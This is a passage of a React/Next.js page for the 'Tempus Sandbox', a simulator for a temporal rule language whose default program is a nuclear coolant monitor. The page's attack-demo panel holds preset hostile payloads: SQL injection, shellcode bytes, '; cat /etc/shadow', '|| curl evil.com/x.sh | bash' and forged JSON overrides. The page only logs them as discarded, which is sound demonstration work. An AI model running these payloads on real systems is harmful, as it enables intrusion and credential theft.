import React, { useState, useEffect, useRef, useCallback } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { lex }           from '../lib/tempus/lexer';
import { parse }         from '../lib/tempus/parser';
import { buildRuntime, createSimulator } from '../lib/tempus/runtime';
import type { SimEvent, CellDecl, ParsedProgram } from '../lib/tempus/types';

// ── Default program ───────────────────────────────────────────────────────────
const DEFAULT = `-- Nuclear coolant temperature monitor
sync coolant_sensor at 10.0e6 freq

cell NOMINAL  bounds (-1.0e-7, 1.0e-7)  action 0
cell WARM     bounds ( 1.0e-7, 5.0e-7)  action 1
cell HOT      bounds ( 5.0e-7, 2.0e-6)  action 2
cell CRITICAL bounds ( 2.0e-6, 1.0e-5)  action 3

compose d=1 channels coolant_sensor into coolant_traj

when NOMINAL  do emit status_ok
when WARM     do emit status_warn
when HOT      do begin
                 emit status_hot;
                 fire reduce_power(0.8)
               end
when CRITICAL do begin
                 emit scram_alert;
                 fire emergency_shutdown
               end`;

// ── Palette ───────────────────────────────────────────────────────────────────
const PALETTE = ['#58E6D9','#f59e0b','#f97316','#ef4444','#60a5fa','#a78bfa','#34d399','#fb923c'];
const ANOMALY = '#4b5563';

function cellPalette(names: string[]): Map<string, string> {
  const m = new Map<string, string>();
  names.forEach((n, i) => m.set(n, PALETTE[i % PALETTE.length]));
  m.set('anomaly', ANOMALY);
  return m;
}

// ── Formatters ────────────────────────────────────────────────────────────────
function fmtDP(v: number): string {
  const a = Math.abs(v);
  if (a === 0) return '0';
  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
  return `${(v * 1e3).toFixed(2)} ms`;
}

function nowStamp(): string {
  const d = new Date();
  return `${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}.${String(d.getMilliseconds()).padStart(3,'0')}`;
}

// ── Chart 1: ΔP timeline (canvas) ────────────────────────────────────────────
function drawDpScatter(
  canvas: HTMLCanvasElement | null,
  events: SimEvent[],
  cells:  Map<string, CellDecl>,
  colors: Map<string, string>
) {
  if (!canvas) return;
  const W = canvas.width  = canvas.offsetWidth;
  const H = canvas.height = canvas.offsetHeight;
  if (W === 0 || H === 0) return;

  const ctx = canvas.getContext('2d')!;
  ctx.clearRect(0, 0, W, H);
  ctx.fillStyle = '#070c09';
  ctx.fillRect(0, 0, W, H);

  const PAD = { l: 54, r: 10, t: 14, b: 28 };
  const iW = W - PAD.l - PAD.r;
  const iH = H - PAD.t - PAD.b;

  const cellArr = Array.from(cells.values());
  const yMin = Math.min(...cellArr.map(c => c.lo));
  const yMax = Math.max(...cellArr.map(c => c.hi));
  const yRange = yMax - yMin || 1;

  const xS = (i: number) => PAD.l + (i / Math.max(events.length - 1, 1)) * iW;
  const yS = (v: number) => PAD.t + iH - ((v - yMin) / yRange) * iH;

  // cell bands
  for (const [name, cell] of cells) {
    const col = colors.get(name) ?? '#888';
    const y1  = yS(cell.hi);
    const y2  = yS(cell.lo);
    ctx.fillStyle = col + '15';
    ctx.fillRect(PAD.l, y1, iW, y2 - y1);
    ctx.strokeStyle = col + '38';
    ctx.lineWidth = 0.5;
    ctx.beginPath(); ctx.moveTo(PAD.l, y1); ctx.lineTo(PAD.l + iW, y1); ctx.stroke();
    ctx.fillStyle = col + '65';
    ctx.font = '8px monospace';
    ctx.textAlign = 'left';
    ctx.fillText(name, PAD.l + 3, (y1 + y2) / 2 + 3);
  }

  // grid
  ctx.strokeStyle = 'rgba(255,255,255,0.04)';
  ctx.lineWidth = 0.5;
  for (let i = 1; i < 5; i++) {
    const x = PAD.l + (iW * i) / 5;
    ctx.beginPath(); ctx.moveTo(x, PAD.t); ctx.lineTo(x, PAD.t + iH); ctx.stroke();
  }
  for (let i = 1; i < 4; i++) {
    const y = PAD.t + (iH * i) / 4;
    ctx.beginPath(); ctx.moveTo(PAD.l, y); ctx.lineTo(PAD.l + iW, y); ctx.stroke();
  }

  // dots
  for (const ev of events) {
    const x = xS(ev.index);
    const y = yS(ev.dp);
    const col = colors.get(ev.cell) ?? ANOMALY;
    ctx.beginPath();
    ctx.arc(x, y, ev.actionFired ? 3.5 : 1.8, 0, Math.PI * 2);
    ctx.fillStyle = ev.actionFired ? col : col + 'a0';
    ctx.fill();
  }

  // axis labels
  ctx.fillStyle = 'rgba(255,255,255,0.35)';
  ctx.font = '8px monospace';
  ctx.textAlign = 'right';
  ctx.fillText(fmtDP(yMax), PAD.l - 3, PAD.t + 7);
  ctx.fillText(fmtDP(yMin), PAD.l - 3, PAD.t + iH + 1);
  ctx.textAlign = 'center';
  ctx.fillText('0', PAD.l, PAD.t + iH + 12);
  ctx.fillText(String(events.length), PAD.l + iW, PAD.t + iH + 12);

  ctx.fillStyle = 'rgba(255,255,255,0.25)';
  ctx.font = '9px monospace';
  ctx.textAlign = 'left';
  ctx.fillText('ΔP  TIMELINE', PAD.l + 4, PAD.t + 10);
}

// ── Cell registry (React) ─────────────────────────────────────────────────────
function CellRegistry({ cells, colors, whens, counts, activeCell }: {
  cells:      Map<string, CellDecl>;
  colors:     Map<string, string>;
  whens:      Map<string, string[]>;
  counts:     Map<string, number>;
  activeCell: string | null;
}) {
  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        CELL  REGISTRY  Γ
      </div>
      <div style={{ flex:1, overflowY:'auto', padding:'0 8px 8px' }}>
        {Array.from(cells.values()).map(cell => {
          const col    = colors.get(cell.name) ?? '#888';
          const acts   = whens.get(cell.name) ?? [];
          const hits   = counts.get(cell.name) ?? 0;
          const active = cell.name === activeCell;
          return (
            <div key={cell.name} style={{
              padding:'7px 9px', marginBottom:3,
              border:`1px solid ${active ? col + 'aa' : 'rgba(255,255,255,0.05)'}`,
              background: active ? col + '12' : 'rgba(255,255,255,0.015)',
              boxShadow: active ? `0 0 14px ${col}28` : 'none',
              transition:'all 0.15s',
            }}>
              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'baseline' }}>
                <span style={{ fontFamily:'monospace', fontSize:11, color: active ? col : col + 'bb',
                               fontWeight: active ? 700 : 400, letterSpacing:'0.04em' }}>
                  {cell.name}
                </span>
                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.22)' }}>
                  {hits}
                </span>
              </div>
              <div style={{ fontFamily:'monospace', fontSize:9, color:'rgba(255,255,255,0.28)', marginTop:2 }}>
                [{fmtDP(cell.lo)},  {fmtDP(cell.hi)}]
              </div>
              {acts.length > 0 && (
                <div style={{ fontFamily:'monospace', fontSize:9, marginTop:2,
                              color: active ? col + 'cc' : 'rgba(255,255,255,0.18)',
                              fontStyle:'italic', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis' }}>
                  {acts[0]}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── ΔP density + partition (SVG) ─────────────────────────────────────────────
function DpPartition({ cells, colors, counts, lastDP }: {
  cells:   Map<string, CellDecl>;
  colors:  Map<string, string>;
  counts:  Map<string, number>;
  lastDP:  number | null;
}) {
  const cellArr = Array.from(cells.values());
  if (cellArr.length === 0) {
    return (
      <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                    fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
        ΔP partition
      </div>
    );
  }

  const xMin  = Math.min(...cellArr.map(c => c.lo));
  const xMax  = Math.max(...cellArr.map(c => c.hi));
  const range = xMax - xMin || 1;

  const W = 600, H = 130;
  const m = { l: 54, r: 10, t: 12, b: 30 };
  const iW = W - m.l - m.r;
  const iH = H - m.t - m.b;   // usable height
  const barH = iH * 0.58;      // histogram portion
  const bandY = m.t + barH + 4; // cell band y
  const bandH = 20;

  const xS = (v: number) => m.l + ((v - xMin) / range) * iW;

  const totalHits = Array.from(counts.values()).reduce((a, b) => a + b, 0) || 1;

  // density = hits / (cell_width * total) — normalised
  const densities = cellArr.map(cell => {
    const w = cell.hi - cell.lo;
    return w > 0 ? (counts.get(cell.name) ?? 0) / (w * totalHits) : 0;
  });
  const maxDens = Math.max(...densities, 1e-12);

  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column' }}>
      <svg viewBox={`0 0 ${W} ${H}`} preserveAspectRatio="xMidYMid meet"
           style={{ width:'100%', flex:1, minHeight:0, display:'block', background:'#070c09' }}>

        {/* title */}
        <text x={m.l + 4} y={10} fill="rgba(255,255,255,0.25)" fontSize={8} fontFamily="monospace">
          ΔP  DENSITY  +  PARTITION
        </text>

        {/* density bars */}
        {cellArr.map((cell, i) => {
          const col  = colors.get(cell.name) ?? '#888';
          const x1   = xS(cell.lo);
          const x2   = xS(cell.hi);
          const bh   = (densities[i] / maxDens) * barH;
          return (
            <g key={cell.name}>
              {/* bg track */}
              <rect x={x1} y={m.t} width={x2 - x1} height={barH} fill={col + '0a'} />
              {/* density bar */}
              <rect x={x1 + 1} y={m.t + barH - bh} width={Math.max(0, x2 - x1 - 2)} height={bh}
                    fill={col + '60'} />
            </g>
          );
        })}

        {/* bar baseline */}
        <line x1={m.l} y1={m.t + barH} x2={m.l + iW} y2={m.t + barH}
              stroke="rgba(255,255,255,0.12)" strokeWidth={0.5} />

        {/* cell bands */}
        {cellArr.map(cell => {
          const col = colors.get(cell.name) ?? '#888';
          const x1  = xS(cell.lo);
          const x2  = xS(cell.hi);
          return (
            <g key={cell.name + '-band'}>
              <rect x={x1} y={bandY} width={x2 - x1} height={bandH} fill={col + '25'} />
              <line x1={x1} y1={bandY} x2={x1} y2={bandY + bandH} stroke={col + '70'} strokeWidth={1} />
              <text x={(x1 + x2) / 2} y={bandY + 13} textAnchor="middle"
                    fill={col + 'cc'} fontSize={8} fontFamily="monospace">
                {cell.name}
              </text>
            </g>
          );
        })}

        {/* x axis */}
        <line x1={m.l} y1={bandY + bandH} x2={m.l + iW} y2={bandY + bandH}
              stroke="#5e5d54" strokeWidth={0.5} />

        {/* tick labels */}
        {[xMin, (xMin + xMax) / 2, xMax].map((v, i) => (
          <text key={i} x={xS(v)} y={H - 6} textAnchor="middle"
                fill="#5e5d54" fontSize={8} fontFamily="monospace">
            {fmtDP(v)}
          </text>
        ))}

        {/* current event marker */}
        {lastDP !== null && (
          <g>
            <line x1={xS(Math.max(xMin, Math.min(xMax, lastDP)))} y1={m.t}
                  x2={xS(Math.max(xMin, Math.min(xMax, lastDP)))} y2={bandY + bandH}
                  stroke="#58E6D9" strokeWidth={1.5} strokeOpacity={0.85} />
            <circle cx={xS(Math.max(xMin, Math.min(xMax, lastDP)))} cy={m.t} r={3} fill="#58E6D9" />
          </g>
        )}
      </svg>
    </div>
  );
}

// ── Action log (React) ────────────────────────────────────────────────────────
interface ActionEntry {
  ts:     string;
  cell:   string;
  action: string;
  dp:     number;
  color:  string;
}

function ActionLog({ entries }: { entries: ActionEntry[] }) {
  if (entries.length === 0) {
    return (
      <div style={{ height:'100%', display:'flex', flexDirection:'column' }}>
        <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
                      color:'rgba(255,255,255,0.22)', fontFamily:'monospace' }}>
          ACTION  LOG
        </div>
        <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center',
                      fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
          no dispatches yet
        </div>
      </div>
    );
  }

  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 12px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        ACTION  LOG
      </div>
      <div style={{ flex:1, overflowY:'auto' }}>
        {entries.map((e, i) => (
          <div key={i} style={{
            display:'grid', gridTemplateColumns:'52px 1fr 58px',
            gap:'0 7px', padding:'4px 10px',
            borderBottom:'1px solid rgba(255,255,255,0.03)',
            fontSize:10, fontFamily:'monospace',
          }}>
            <span style={{ color:'rgba(255,255,255,0.22)' }}>{e.ts}</span>
            <div style={{ minWidth:0 }}>
              <span style={{ color: e.color, fontWeight:600 }}>{e.cell}</span>
              <span style={{ color:'rgba(255,255,255,0.38)', marginLeft:6,
                             whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis',
                             display:'inline-block', maxWidth:'calc(100% - 70px)', verticalAlign:'bottom' }}>
                {e.action}
              </span>
            </div>
            <span style={{ color:'rgba(255,255,255,0.25)', textAlign:'right', fontSize:9 }}>
              {fmtDP(e.dp)}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── State strip ───────────────────────────────────────────────────────────────
function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
  phase:      string;
  cycle:      number;
  lastDP:     number | null;
  activeCell: string | null;
  lastAction: string | null;
  colors:     Map<string, string>;
}) {
  const phaseCol  = phase === 'EXECUTE' ? '#f59e0b' : phase === 'COMPILE' ? '#60a5fa' : '#4b5563';
  const phaseGlow = phase === 'EXECUTE' ? 'rgba(245,158,11,0.18)' : 'transparent';
  const cellCol   = activeCell ? (colors.get(activeCell) ?? 'rgba(255,255,255,0.6)') : 'rgba(255,255,255,0.25)';

  const items = [
    {
      k: 'Phase σ',
      v: (
        <span style={{
          display:'inline-block', padding:'2px 7px',
          border:`1px solid ${phaseCol}`, color: phaseCol,
          fontSize:10, fontFamily:'monospace', letterSpacing:'0.1em',
          background: phaseGlow, boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none',
        }}>
          {phase}
        </span>
      ),
    },
    { k: 'Cycle M',     v: cycle > 0 ? cycle.toLocaleString() : '—', c: 'rgba(255,255,255,0.7)' },
    { k: 'ΔP(k)',       v: lastDP !== null ? fmtDP(lastDP) : '—',    c: 'rgba(255,255,255,0.7)' },
    { k: 'Cell',        v: activeCell ?? '—',                         c: cellCol },
    { k: 'Last action', v: lastAction ?? '—',                         c: 'rgba(255,255,255,0.45)', small: true },
  ] as const;

  return (
    <div style={{
      display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
      borderBottom:'1px solid rgba(255,255,255,0.07)',
      background:'#080e0b', flexShrink:0,
    }}>
      {items.map((item, i) => (
        <div key={i} style={{
          padding:'9px 14px',
          borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none',
        }}>
          <div style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.22)',
                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>
            {item.k}
          </div>
          {'v' in item && typeof item.v === 'string' ? (
            <div style={{ fontSize: 'small' in item && item.small ? 10 : 14,
                          color: 'c' in item ? item.c : undefined,
                          fontFamily:'monospace', fontWeight:600, lineHeight:1.2,
                          whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis' }}>
              {item.v}
            </div>
          ) : (
            <div>{item.v}</div>
          )}
        </div>
      ))}
    </div>
  );
}

// ── Attack panel (Structural Incorruptibility demo) ───────────────────────────
const ATTACK_PRESETS: Record<string, string> = {
  'SQL':  `'; DROP TABLE reactor_logs; --\nUNION SELECT password FROM admin_users WHERE '1'='1\nALTER TABLE cells DROP COLUMN bounds; --`,
  'BOF':  `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0`,
  'CMD':  `; cat /etc/shadow\n|| curl evil.com/x.sh | bash\n$(wget reactor.local/scram -O -)`,
  'JSON': `{"op":"emergency_shutdown","authorized":true,"by":"admin"}\n{"cell":"CRITICAL","force_dispatch":true}\n{"override":{"cell_map":{"MELT":{"action":"meltdown"}}}}`,
};

interface AttackEntry { ts: string; bytes: number; label: string; }

function AttackPanel({ cells }: { cells: Map<string, CellDecl> }) {
  const [payload, setPayload] = useState(
    `'; DROP TABLE reactor_logs; --\n\nAAAAAAAAAAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\n\n{"op":"emergency_shutdown","authorized":true}`
  );
  const [log,   setLog]   = useState<AttackEntry[]>([]);
  const [stats, setStats] = useState({ injections: 0, bytes: 0 });

  const inject = useCallback((text: string) => {
    setLog(prev => [{
      ts:    nowStamp(),
      bytes: text.length,
      label: text.slice(0, 55).replace(/[\r\n]+/g, ' '),
    }, ...prev].slice(0, 60));
    setStats(s => ({ injections: s.injections + 1, bytes: s.bytes + text.length }));
  }, []);

  const flood = useCallback(() => {
    for (let i = 0; i < 100; i++) setTimeout(() => inject(payload + `\n#${i}`), i * 8);
  }, [payload, inject]);

  return (
    <div style={{ display:'flex', flexDirection:'column', height:'100%', overflow:'hidden' }}>

      {/* explainer */}
      <div style={{ padding:'10px 14px', background:'#0a1209',
                    borderBottom:'1px solid rgba(255,255,255,0.05)',
                    fontSize:11, fontFamily:'monospace', color:'rgba(255,255,255,0.35)', lineHeight:1.55 }}>
        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>.
        The only datum a pulse contributes is <em style={{ color:'rgba(255,255,255,0.65)' }}>when it arrived</em>.
        Inject any payload — the action set stays bounded by the compiled cell registry.{' '}
        <span style={{ color:'rgba(255,255,255,0.2)' }}>Thm. 6.1</span>
      </div>

      {/* payload editor */}
      <div style={{ padding:'10px 12px', borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        <textarea
          value={payload}
          onChange={e => setPayload(e.target.value)}
          spellCheck={false}
          style={{ width:'100%', background:'#0c0808', color:'#ef4444', fontFamily:'monospace',
                   fontSize:11, lineHeight:1.6, padding:'9px 11px',
                   border:'1px solid rgba(239,68,68,0.2)', resize:'vertical',
                   minHeight:76, outline:'none', boxSizing:'border-box' }}
        />
        <div style={{ display:'flex', gap:5, flexWrap:'wrap', marginTop:7 }}>
          {Object.entries(ATTACK_PRESETS).map(([k, v]) => (
            <button key={k} onClick={() => setPayload(v)}
              style={{ fontFamily:'monospace', fontSize:9, letterSpacing:'0.06em', padding:'3px 7px',
                       border:'1px solid rgba(255,255,255,0.1)', background:'transparent',
                       color:'rgba(255,255,255,0.35)', cursor:'pointer' }}>
              {k}
            </button>
          ))}
        </div>
        <div style={{ display:'flex', gap:7, marginTop:8 }}>
          <button onClick={() => inject(payload)}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
                     background:'rgba(239,68,68,0.12)', color:'#ef4444',
                     border:'1px solid rgba(239,68,68,0.4)', cursor:'pointer' }}>
            INJECT
          </button>
          <button onClick={flood}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
                     background:'transparent', color:'rgba(255,255,255,0.3)',
                     border:'1px solid rgba(255,255,255,0.1)', cursor:'pointer' }}>
            FLOOD ×100
          </button>
          <button onClick={() => { setLog([]); setStats({ injections: 0, bytes: 0 }); }}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 14px',
                     background:'transparent', color:'rgba(255,255,255,0.18)',
                     border:'1px solid rgba(255,255,255,0.07)', cursor:'pointer', marginLeft:'auto' }}>
            RESET
          </button>
        </div>
      </div>

      {/* counters */}
      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr 1fr',
                    borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        {[
          ['INJECTED',  String(stats.injections),                  undefined],
          ['BYTES',     stats.bytes.toLocaleString(),               undefined],
          ['PARSERS',   '0',                                        '#34d399'],
          ['|Cells(A)|', String(cells.size),                       '#58E6D9'],
        ].map(([k, v, c]) => (
          <div key={k as string} style={{ padding:'9px 8px', textAlign:'center',
                                          borderRight:'1px solid rgba(255,255,255,0.04)' }}>
            <div style={{ fontSize:8, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)',
                          fontFamily:'monospace' }}>{k}</div>
            <div style={{ fontSize:15, color: (c ?? 'rgba(255,255,255,0.65)') as string,
                          fontFamily:'monospace', fontWeight:700, marginTop:2 }}>{v}</div>
          </div>
        ))}
      </div>

      {/* injection log */}
      <div style={{ flex:1, overflowY:'auto' }}>
        {log.length === 0 ? (
          <div style={{ textAlign:'center', padding:'24px 16px', fontFamily:'monospace', fontSize:10,
                        color:'rgba(255,255,255,0.12)', fontStyle:'italic' }}>
            no injections yet
          </div>
        ) : log.map((e, i) => (
          <div key={i} style={{ display:'grid', gridTemplateColumns:'52px 42px 1fr',
                                gap:'0 7px', padding:'4px 12px',
                                borderBottom:'1px solid rgba(255,255,255,0.03)',
                                fontSize:10, fontFamily:'monospace' }}>
            <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
            <span style={{ color:'rgba(239,68,68,0.55)' }}>{e.bytes}B</span>
            <span style={{ color:'rgba(255,255,255,0.18)', fontStyle:'italic',
                           overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
              discarded · no parser
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────
interface Stats { total: number; dispatched: number; anomalies: number; done: boolean; }
interface LiveState {
  phase: string; cycle: number; lastDP: number | null;
  activeCell: string | null; lastAction: string | null;
}

function TempusSandbox() {
  const [code,       setCode]       = useState(DEFAULT);
  const [nEvents,    setNEvents]    = useState(600);
  const [noise,      setNoise]      = useState(0.35);
  const [speed,      setSpeed]      = useState(200);
  const [error,      setError]      = useState<string | null>(null);
  const [running,    setRunning]    = useState(false);
  const [leftTab,    setLeftTab]    = useState<'program' | 'attack'>('program');
  const [stats,      setStats]      = useState<Stats>({ total:0, dispatched:0, anomalies:0, done:false });
  const [liveState,  setLiveState]  = useState<LiveState>({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
  const [actionLog,  setActionLog]  = useState<ActionEntry[]>([]);
  const [parsedProg, setParsedProg] = useState<ParsedProgram | null>(null);
  const [colors,     setColors]     = useState<Map<string, string>>(new Map());
  const [cellCounts, setCellCounts] = useState<Map<string, number>>(new Map());

  const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
  const colorsRef   = useRef<Map<string, string>>(new Map());
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const dpRef       = useRef<HTMLCanvasElement>(null);

  const redrawCanvas = useCallback(() => {
    if (!simRef.current) return;
    drawDpScatter(dpRef.current, simRef.current.getEvents(), simRef.current.getCells(), colorsRef.current);
  }, []);

  const handleRun = useCallback(() => {
    try {
      setError(null);
      const prog = buildRuntime(parse(lex(code)));
      const newColors = cellPalette(Array.from(prog.cells.keys()));
      colorsRef.current = newColors;
      setColors(newColors);
      setParsedProg(prog);
      setActionLog([]);
      setCellCounts(new Map());
      setLiveState({ phase:'COMPILE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
      const batchSize = Math.max(1, Math.floor(speed / 20));
      simRef.current  = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
      setRunning(true);
    } catch (e: any) {
      setError(String(e.message));
    }
  }, [code, nEvents, noise, speed]);

  const handleStop = useCallback(() => {
    if (intervalRef.current) clearInterval(intervalRef.current);
    setRunning(false);
    setLiveState(s => ({ ...s, phase: 'IDLE' }));
  }, []);

  const handleReset = useCallback(() => {
    handleStop();
    simRef.current?.reset();
    setActionLog([]);
    setCellCounts(new Map());
    setStats({ total:0, dispatched:0, anomalies:0, done:false });
    setLiveState({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
    if (dpRef.current) {
      const ctx = dpRef.current.getContext('2d');
      ctx?.clearRect(0, 0, dpRef.current.width, dpRef.current.height);
    }
  }, [handleStop]);

  // simulation loop
  useEffect(() => {
    if (!running) return;
    intervalRef.current = setInterval(() => {
      if (!simRef.current || simRef.current.isDone()) {
        setRunning(false);
        setLiveState(s => ({ ...s, phase:'IDLE' }));
        return;
      }
      const batch = simRef.current.generateBatch();
      const last  = batch[batch.length - 1];
      if (last) {
        setLiveState({
          phase:      last.phase,
          cycle:      last.M,
          lastDP:     last.dp,
          activeCell: last.cell,
          lastAction: last.actionFired,
        });
      }

      const completions = batch.filter(e => e.actionFired !== null);
      if (completions.length > 0) {
        const newEntries: ActionEntry[] = completions.map(e => ({
          ts:     nowStamp(),
          cell:   e.cell,
          action: e.actionFired!,
          dp:     e.dp,
          color:  colorsRef.current.get(e.cell) ?? ANOMALY,
        }));
        setActionLog(prev => [...newEntries, ...prev].slice(0, 80));
      }

      const events = simRef.current.getEvents();
      const cnts   = new Map<string, number>();
      events.forEach(ev => cnts.set(ev.cell, (cnts.get(ev.cell) ?? 0) + 1));
      setCellCounts(new Map(cnts));

      setStats({
        total:      events.length,
        dispatched: events.filter(e => e.actionFired !== null).length,
        anomalies:  events.filter(e => e.cell === 'anomaly').length,
        done:       simRef.current.isDone(),
      });

      redrawCanvas();
    }, 50);
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, [running, redrawCanvas]);

  // resize observer
  useEffect(() => {
    if (!dpRef.current) return;
    const ro = new ResizeObserver(() => redrawCanvas());
    ro.observe(dpRef.current);
    return () => ro.disconnect();
  }, [redrawCanvas]);

  const pct = nEvents > 0 ? Math.round((stats.total / nEvents) * 100) : 0;

  return (
    <div style={{ background:'#030705', color:'#e2e8f0', height:'100vh',
                  fontFamily:'monospace', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <Head><title>Tempus Sandbox</title></Head>

      {/* ── header ── */}
      <header style={{ height:50, borderBottom:'1px solid rgba(255,255,255,0.07)',
                       display:'flex', alignItems:'center', padding:'0 20px', gap:16, flexShrink:0 }}>
        <Link href="/" style={{ color:'rgba(255,255,255,0.3)', fontSize:10,
                                textDecoration:'none', letterSpacing:'0.16em' }}>← BACK</Link>
        <span style={{ color:'rgba(255,255,255,0.85)', fontSize:11, letterSpacing:'0.3em', fontWeight:700 }}>
          TEMPUS
        </span>
        <div style={{ marginLeft:'auto', display:'flex', gap:7 }}>
          {[
            { label:'RUN ▶', onClick: handleRun,  disabled: running,
              style: { background: running ? '#1a2a1a' : '#58E6D9', color: running ? '#445' : '#020f0d',
                       border:'none', fontWeight:700 } },
            { label:'STOP',  onClick: handleStop, disabled: !running,
              style: { background:'transparent', color: !running ? 'rgba(255,255,255,0.15)' : '#ef4444',
                       border:`1px solid ${!running ? 'rgba(255,255,255,0.07)' : '#ef4444'}` } },
            { label:'RESET', onClick: handleReset, disabled: false,
              style: { background:'transparent', color:'rgba(255,255,255,0.28)',
                       border:'1px solid rgba(255,255,255,0.1)' } },
          ].map(b => (
            <button key={b.label} onClick={b.onClick} disabled={b.disabled}
              style={{ padding:'5px 15px', fontSize:10, letterSpacing:'0.12em',
                       cursor: b.disabled ? 'not-allowed' : 'pointer',
                       fontFamily:'monospace', ...b.style }}>
              {b.label}
            </button>
          ))}
        </div>
      </header>

      {/* ── body ── */}
      <div style={{ display:'flex', flex:1, overflow:'hidden', minHeight:0 }}>

        {/* ── LEFT ── */}
        <div style={{ width:395, flexShrink:0, borderRight:'1px solid rgba(255,255,255,0.07)',
                      display:'flex', flexDirection:'column', overflow:'hidden' }}>

          {/* tabs */}
          <div style={{ display:'flex', borderBottom:'1px solid rgba(255,255,255,0.07)', flexShrink:0 }}>
            {(['program', 'attack'] as const).map(tab => (
              <button key={tab} onClick={() => setLeftTab(tab)}
                style={{ flex:1, padding:'9px 8px', fontFamily:'monospace', fontSize:9,
                         letterSpacing:'0.16em', textTransform:'uppercase',
                         background:'transparent', border:'none', cursor:'pointer',
                         borderBottom: leftTab === tab ? '2px solid #58E6D9' : '2px solid transparent',
                         color: leftTab === tab ? '#58E6D9' : 'rgba(255,255,255,0.28)',
                         transition:'all 0.12s' }}>
                {tab === 'attack' ? 'Structural Incorruptibility' : 'Program'}
              </button>
            ))}
          </div>

          {/* PROGRAM tab */}
          {leftTab === 'program' && (<>
            <textarea
              value={code} onChange={e => setCode(e.target.value)} spellCheck={false}
              style={{ flex:1, background:'#060b08', color:'#c8faf5', fontFamily:'monospace',
                       fontSize:11.5, lineHeight:1.65, padding:'14px', border:'none',
                       resize:'none', outline:'none', minHeight:0 }}
            />
            {error && (
              <div style={{ background:'#170606', color:'#ef4444', fontSize:10,
                            padding:'8px 12px', borderTop:'1px solid #3a1010',
                            lineHeight:1.5 }}>
                {error}
              </div>
            )}
            <div style={{ padding:'11px 13px', borderTop:'1px solid rgba(255,255,255,0.06)',
                          display:'flex', flexDirection:'column', gap:9, flexShrink:0 }}>
              <div style={{ display:'grid', gridTemplateColumns:'68px auto 1fr', gap:8, alignItems:'center' }}>
                <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.3)', textTransform:'uppercase' }}>Events</label>
                <input type="number" value={nEvents} min={50} max={5000} step={50}
                  onChange={e => setNEvents(+e.target.value)}
                  style={{ width:76, background:'#0d1a14', border:'1px solid rgba(255,255,255,0.08)',
                           color:'#c8faf5', fontFamily:'monospace', fontSize:11, padding:'3px 6px' }}
                />
              </div>
              {[
                { label:'Noise σ', min:0, max:1, step:0.05, val:noise, set:setNoise, fmt:(v:number) => v.toFixed(2), unit:'' },
                { label:'Speed',   min:20, max:1000, step:20, val:speed, set:setSpeed, fmt:(v:number) => String(v), unit:'/s' },
              ].map(({ label, min, max, step, val, set, fmt, unit }) => (
                <div key={label} style={{ display:'grid', gridTemplateColumns:'68px 1fr 44px', gap:8, alignItems:'center' }}>
                  <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.3)', textTransform:'uppercase' }}>{label}</label>
                  <input type="range" min={min} max={max} step={step} value={val}
